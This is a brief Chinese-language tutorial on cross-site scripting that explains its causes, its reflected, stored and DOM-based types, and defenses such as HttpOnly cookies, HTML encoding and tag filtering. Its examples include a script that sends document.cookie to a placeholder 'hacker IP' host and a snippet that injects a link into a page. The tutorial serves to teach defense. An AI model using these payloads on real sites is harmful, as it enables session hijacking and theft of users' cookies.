## XSS原理与防御
Cross Site Scripting(跨站脚本攻击)
### 1.XSS发生原因
* 1.将恶意的js代码插入到页面中
* 2.html实体的存在是导致XSS漏洞的主要原因之一
### 2.XSS类型
* 1.反射型xss攻击（非持久性跨站点脚本攻击）

    示例（接收者接收消息显示的时候将会弹出警告窗口）
    ```js
    http://www.test.com/message.php?send=<script>alert(‘foolish!’)</script>！
    ```
* 2.存贮型xss攻击
    示例:
    攻击者在表单中填入恶意的js代码，将数据提交到服务器，存储到数据库中，其他用户去除数据展示时，执行攻击性代码
* 3.DOM-XSS
    示例1(盗取cookie):
    ```js
    // 恶意代码
    <script type=text/javascript>window.location = "http://黑客IP:8360/getcookie?cookie="+document.cookie</script>
    ```
    示例2(改变dom):
    ```js
    // 恶意代码
    <script>
        var a = document.createElement('a');
        a.href = 'http://www.linuxtest.com/test2.php';
        a.innerText = '点我呀'
        document.body.appendChild('afterbegin', a);
    </script>
    ```
### 3.XSS防御
* 1.将重要的cookie标识为http only,这样Js中的document.cookie语句就不能获取到cookie了
* 2.对数据进行Html Encode处理（转义）
* 3.黑名单，白名单（过滤）
    * 将<script> onerror这种危险标签纳入黑名单，过滤掉
    * 设置标签白名单，不在白名单内的，一律过滤掉